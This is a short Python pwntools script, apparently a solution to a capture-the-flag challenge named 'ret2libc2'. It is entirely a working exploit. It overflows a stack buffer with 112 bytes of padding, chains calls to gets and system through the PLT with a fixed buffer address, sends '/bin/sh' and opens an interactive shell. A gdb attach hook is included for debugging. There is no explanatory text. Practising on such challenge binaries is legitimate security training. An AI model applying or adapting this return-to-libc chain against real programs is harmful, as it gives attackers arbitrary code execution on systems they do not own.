from pwn import *

io = process("./ret2libc2")
elf = ELF('./ret2libc2')

context.log_level = 'debug'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

def p():
    gdb.attach(proc.pidof(io)[0])


sys_addr = elf.plt['system']
get_addr = elf.plt['gets']
buf2_addr = 0x0804A080

payload1 = b'a'*112+p32(get_addr)+p32(sys_addr)+p32(buf2_addr)+p32(buf2_addr)

p()
io.recvuntil(b'think ?')
io.sendline(payload1)

payload2 = b'/bin/sh'
io.sendline(payload2)

io.interactive()